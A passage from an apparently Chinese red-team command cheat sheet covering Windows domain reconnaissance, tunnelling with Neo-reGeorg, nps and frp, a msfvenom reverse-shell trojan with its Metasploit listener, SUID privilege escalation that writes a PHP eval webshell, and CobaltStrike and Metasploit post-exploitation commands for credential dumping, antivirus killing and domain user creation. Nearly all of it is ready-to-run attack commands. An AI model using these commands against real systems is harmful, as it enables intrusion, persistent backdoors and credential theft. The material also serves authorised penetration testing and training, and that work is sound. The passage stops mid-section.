<h5 id="查看域控制器列表-net-group"><a href="#查看域控制器列表-net-group" class="headerlink" title="查看域控制器列表 net group"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%88%97%E8%A1%A8-net-group"></a>查看域控制器列表 net group</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group &quot;domain controllers&quot; /domain<br></code></pre></td></tr></table></figure>

<h4 id="查找域管理员进程"><a href="#查找域管理员进程" class="headerlink" title="查找域管理员进程"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B"></a>查找域管理员进程</h4><h5 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8"></a>获取域管理员列表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group &quot;domain admins&quot; /domain<br></code></pre></td></tr></table></figure>

<h5 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%97%E5%87%BA%E6%9C%AC%E6%9C%BA%E7%9A%84%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8F%8A%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7"></a>列出本机的所有进程及进程用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist /v<br></code></pre></td></tr></table></figure>

<h4 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"></a>定位域管理员</h4><h5 id="psloggedon查询"><a href="#psloggedon查询" class="headerlink" title="psloggedon查询"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#psloggedon%E6%9F%A5%E8%AF%A2"></a>psloggedon查询</h5><p>直接运行该程序即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; Psloggedon.exe<br></code></pre></td></tr></table></figure>

<h5 id="netview查询"><a href="#netview查询" class="headerlink" title="netview查询"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#netview%E6%9F%A5%E8%AF%A2"></a>netview查询</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netview.exe -d<br></code></pre></td></tr></table></figure>

<p>netview参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-f filename.txt：指定要提取主机列表的文件<br>-e filename.txt：指定要排除的主机名的文件<br>-o filename.txt：将所有输出重定向到指定的文件<br>-d domain：指定要提取主机列表的域<br>-g group：指定要搜索的组名<br>-c：对已经找到的共享目录/文件的访问权限进行检查<br></code></pre></td></tr></table></figure>

<h2 id="内网穿透代理"><a href="#内网穿透代理" class="headerlink" title="内网穿透代理"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86"></a>内网穿透代理</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#neo-regeorg"></a>Neo-reGeorg</h3><ol>
<li>攻击机生成tunnel.(aspx|ashx|jsp|jspx|php) 并上传Web Server 1.1.1.1</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python neoreg.py generate -k password<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>攻击机通过neoreg.py连接Web Server</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python neoreg.py -k password -u http://1.1.1.1/tunnel.jsp<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>配置本地代理访问内网服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SOCKS5    127.0.0.1    1080<br></code></pre></td></tr></table></figure>

<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ssh"></a>ssh</h3><p>将对A:X的访问转变成对C:Z的访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh -L 主机A端口X:主机C:主机C端口Z -N -f username@hostname<br><br># 例如<br>ssh -L 27689:192.168.20.100:27689 -N -f root@172.16.0.10<br></code></pre></td></tr></table></figure>

<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#nps"></a>nps</h3><ol>
<li>攻击机启动服务，新增client，新增socks5</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo -s<br>./nps install<br>./nps<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>上传nps client，根据给出的命令连接nps server</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># Windows客户端<br>.\npc.exe -server=1.1.1.1:8024 -vkey=ihmtyta4i4f3rm3z -type=tcp<br><br># Linux客户端<br>.\npc -server=1.1.1.1:8024 -vkey=ihmtyta4i4f3rm3z -type=tcp<br></code></pre></td></tr></table></figure>

<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#frp"></a>frp</h3><ol>
<li>根据配置文件frps.ini运行服务端</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]<br>bind_port = 7000<br>dashboard_port = 7500<br>dashboard_user = admin<br>dashboard_pwd = &lt;your-password-here&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./frps -c frps.ini  <br></code></pre></td></tr></table></figure>

<ol start="2">
<li>根据配置文件frpc.ini运行客户端</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[common]<br>server_addr = &lt;your-vps-ip-here&gt;<br>server_port = 7000<br><br>[msf]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 4444<br>remote_port = 9001<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./frpc -c frpc.ini  <br></code></pre></td></tr></table></figure>

<ol start="3">
<li>msf生成木马&#x2F;behinder3生成木马</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your-vps-ip-here&gt; LPORT=9001 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>msf监听反弹shell</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msf &gt; use exploit/multi/handler<br><br># 监听windows shell<br>msf exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br><br># 监听behinder3 shell<br>msf exploit(multi/handler) &gt; set PAYLOAD java/meterpreter/reverse_tcp<br><br>msf exploit(multi/handler) &gt; set LHOST 127.0.0.1<br><br>msf exploit(multi/handler) &gt; set LPORT 4444<br><br>msf exploit(multi/handler) &gt; run<br></code></pre></td></tr></table></figure>

<h2 id="内网权限提升"><a href="#内网权限提升" class="headerlink" title="内网权限提升"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"></a>内网权限提升</h2><h3 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"></a>Windows系统提权</h3><p>Windows-Exploit-Suggester进行缺失补丁信息收集：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python windows-exploit-suggester.py --database 2022-03-16-mssb.xls --systeminfo win7_systeminfo.txt<br></code></pre></td></tr></table></figure>

<p>通过补丁信息判断当前系统是否可以通过以下内核漏洞进行提权：</p>
<ul>
<li>CVE-2019-0803</li>
<li>CVE-2018-8120</li>
<li>CVE-2018-8440</li>
</ul>
<h3 id="Linux系统提权"><a href="#Linux系统提权" class="headerlink" title="Linux系统提权"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"></a>Linux系统提权</h3><p>查找系统中存在suid的可执行文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>通过存在suid的命令在root权限下执行其他命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 写入webshell<br>find /var/www/html -exec touch update.php ;<br>find /var/www/html -exec echo ‘&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;’ &gt; update.php ;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查找/etc/目录下包含password的文件<br>find /var/www/html -exec find / -type f | xargs -I &#123;&#125; grep -l password &#123;&#125; ;<br></code></pre></td></tr></table></figure>

<h2 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7"></a>内网渗透工具</h2><h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#cobaltstrike"></a>CobaltStrike</h3><p>团队服务器启动CS服务，注意<strong>修改teamserver端口号</strong>，默认为50050：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">./teamserver 1.1.1.1 password<br></code></pre></td></tr></table></figure>

<p>beacon命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">argue                     进程参数欺骗<br>blockdlls                 阻止子进程加载非Microsoft DLL<br>browserpivot              注入受害者浏览器进程<br>bypassuac                 绕过UAC提升权限<br>cancel                    取消正在进行的下载<br>cd                        切换目录<br>checkin                   强制让被控端回连一次<br>clear                     清除beacon内部的任务队列<br>connect                   Connect to a Beacon peer over TCP<br>covertvpn                 部署Covert VPN客户端<br>cp                        复制文件<br>dcsync                    从DC中提取密码哈希<br>desktop                   远程桌面(VNC)<br>dllinject                 反射DLL注入进程dll<br>load                         使用LoadLibrary将DLL加载到进程中<br>download                  下载文件<br>downloads                 列出正在进行的文件下载<br>drives                    列出目标盘符<br>elevate                   使用exp<br>execute                   在目标上执行程序(无输出)<br>execute-assembly          在目标上内存中执行本地.NET程序<br>exit                      终止beacon会话<br>getprivs                  Enable system privileges on current token<br>getsystem                 尝试获取SYSTEM权限<br>getuid                    获取用户ID<br>hashdump                  转储密码哈希值<br>help                      帮助<br>inject                    在注入进程生成会话<br>jobkill                   结束一个后台任务<br>jobs                      列出后台任务<br>kerberos_ccache_use       从cache文件中导入票据应用于此会话<br>kerberos_ticket_purge     清除当前会话的票据<br>kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话<br>keylogger                 键盘记录<br>kill                      结束进程<br>link                      Connect to a Beacon peer over a named pipe<br>logonpasswords            使用mimikatz转储凭据和哈希值<br>ls                        列出文件<br>make_token                创建令牌以传递凭据<br>mimikatz                  运行mimikatz<br>mkdir                     创建一个目录<br>mode dns                  使用DNS A作为通信通道(仅限DNS beacon)<br>mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)<br>mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)<br>mode http                 使用HTTP作为通信通道<br>mv                        移动文件<br>net                       net命令<br>note                      备注       <br>portscan                  进行端口扫描<br>powerpick                 通过Unmanaged PowerShell执行命令<br>powershell                通过powershell.exe执行命令<br>powershell-import         导入powershell脚本<br>ppid                      Set parent PID for spawned post-ex jobs<br>ps                        显示进程列表<br>psexec                    Use a service to spawn a session on a host<br>psexec_psh                Use PowerShell to spawn a session on a host<br>psinject                  在特定进程中执行PowerShell命令<br>pth                       使用Mimikatz进行传递哈希<br>pwd                       当前目录位置<br>reg                       Query the registry<br>rev2self                  恢复原始令牌<br>rm                        删除文件或文件夹<br>rportfwd                  端口转发<br>run                       在目标上执行程序(返回输出)<br>runas                     以其他用户权限执行程序<br>runasadmin                在高权限下执行程序<br>runu                      Execute a program under another PID<br>screenshot                屏幕截图<br>setenv                    设置环境变量<br>shell                     执行cmd命令<br>shinject                  将shellcode注入进程<br>shspawn                   启动一个进程并将shellcode注入其中<br>sleep                     设置睡眠延迟时间<br>socks                     启动SOCKS4代理<br>socks stop                停止SOCKS4<br>spawn                     Spawn a session <br>spawnas                   Spawn a session as another user<br>spawnto                   Set executable to spawn processes into<br>spawnu                    Spawn a session under another PID<br>ssh                       使用ssh连接远程主机<br>ssh-key                   使用密钥连接远程主机<br>steal_token               从进程中窃取令牌<br>timestamp                 将一个文件的时间戳应用到另一个文件<br>unlink                    Disconnect from parent Beacon<br>upload                    上传文件<br>wdigest                   使用mimikatz转储明文凭据<br>winrm                     使用WinRM横向渗透<br>wmi                       使用WMI横向渗透<br></code></pre></td></tr></table></figure>

<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#metasploit"></a>Metasploit</h3><p>msfconsole常用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reload_all                        #从目录重载所有模块<br>back                            #后退命令，移出当前上下文，用于模块切换<br>info                            #目标和模块详细信息<br>check                            #检查目标是否受某个漏洞影响<br>background                      #切到后台<br>sessions                        #会话管理<br>sessions -l                        #列出所有会话<br>sessions -K                        #终止所有会话<br>sessions -i id                    #进入某个会话<br>sessions -v                        #以详细模式列出会话<br>sessions -u                        #在许多平台上将shell升级到meterpreter会话<br>show options                    #显示可选选项<br>     auxiliary                    #显示所有辅助模块<br>     exploits                    #显示所有漏洞利用模块<br>     payloads                    #显示所有有效载荷<br>     targets                    #显示所有可用目标<br>     advanced                    #显示更多高级选项<br>     encoders                    #显示可用编码器列表<br><br>set/unset                          #设置/禁用模块中的某个参数 <br>setg/unsetg                      #设置/禁用适用于所有模块的全局参数 <br>set proxies sock5:127.0.0.1:8000 #设置代理<br><br>save                             #将当前设置值保存下来，以便下次启动MSF终端时仍可使用<br></code></pre></td></tr></table></figure>

<h4 id="msfconsole辅助模块（Auxiliary）"><a href="#msfconsole辅助模块（Auxiliary）" class="headerlink" title="msfconsole辅助模块（Auxiliary）"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97auxiliary"></a>msfconsole辅助模块（Auxiliary）</h4><p>端口扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use auxiliary/scanner/portmap/portmap_amp<br>use auxiliary/scanner/portscan/ftpbounce<br>use auxiliary/scanner/portscan/tcp<br>use auxiliary/scanner/portscan/ack<br>use auxiliary/scanner/portscan/syn<br>use auxiliary/scanner/portscan/xmas<br></code></pre></td></tr></table></figure>

<p>服务扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auxiliary/scanner/ssh/ssh_login            # SSH爆破<br>auxiliary/scanner/vnc/vnc_none_auth        # VNC空口令扫描<br>auxiliary/scanner/telnet/telnet_login   # Telnet爆破<br>auxiliary/scanner/smb/smb_version        # SMB系统版本扫描<br>auxiliary/scanner/smb/smb_enumusers        # SMB枚举<br>auxiliary/scanner/smb/smb_login            # SMB弱口令登录<br>auxiliary/admin/smb/psexec_command        # 登录SMB且执行命令<br>auxiliary/scanner/redis/redis_login        # Redis爆破<br>auxiliary/scanner/mssql/mssql_ping        # MSSQL主机信息扫描<br>auxiliary/admin/mssql/mssql_enum        # MSSQL枚举<br>auxiliary/scanner/mysql/mysql_login        # MySQL弱口令扫描<br>auxiliary/admin/mysql/mysql_enum        # MySQL枚举<br></code></pre></td></tr></table></figure>

<h4 id="msfconsole后渗透攻击模块-Post"><a href="#msfconsole后渗透攻击模块-Post" class="headerlink" title="msfconsole后渗透攻击模块 (Post)"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97-post"></a>msfconsole后渗透攻击模块 (Post)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/manage/migrate                             # 自动进程迁移<br>run post/windows/gather/checkvm                            # 查看目标主机是虚拟机<br>run post/windows/manage/killav                            # 关闭杀毒软件<br>run post/windows/manage/enable_rdp                      # 开启远程桌面服务<br>run post/windows/manage/autoroute                       # 查看路由信息<br>run post/windows/gather/enum_logged_on_users             # 列举当前登录的用户<br>run post/windows/gather/enum_applications                # 列举目标主机应用程序<br>run post/windows/gather/credentials/windows_autologin   # 抓取自动登录的用户名和密码<br>run post/windows/gather/smart_hashdump                     # dump出所有用户的<br>hash<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/manage/payload_inject                    # 将另一个payload添加进原有的会话id，从而返回一个新的会话id<br>run post/windows/manage/enable_rdp                        # 自动开启3389端口（也可任意端口）<br>run post/windows/manage/multi_meterpreter_inject        # Inject in Memory射入内存<br>run post/windows/gather/credentials/sso                    # 获取明文密码<br></code></pre></td></tr></table></figure>

<p>域控相关：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/gather/enum_domain                        # 查看域控<br>run post/windows/gather/enum_domain_group_users            # 枚举域组<br>run post/windows/gather/enum_domain_users                # 枚举活动域用户<br>run post/windows/gather/enum_tokens                        # 枚举域管理令牌<br>run post/windows/gather/local_admin_search_enum            # 收集本地windows管理员<br>run post/windows/manage/add_user_domain                    # 将用户添加到域和/或域组<br></code></pre></td></tr></table></figure>

<h4 id="msfconsole渗透攻击模块（Exploit）"><a href="#msfconsole渗透攻击模块（Exploit）" class="headerlink" title="msfconsole渗透攻击模块（Exploit）"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfconsole%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97exploit"></a>msfconsole渗透攻击模块（Exploit）</h4><p>绕过UAC限制：</p>
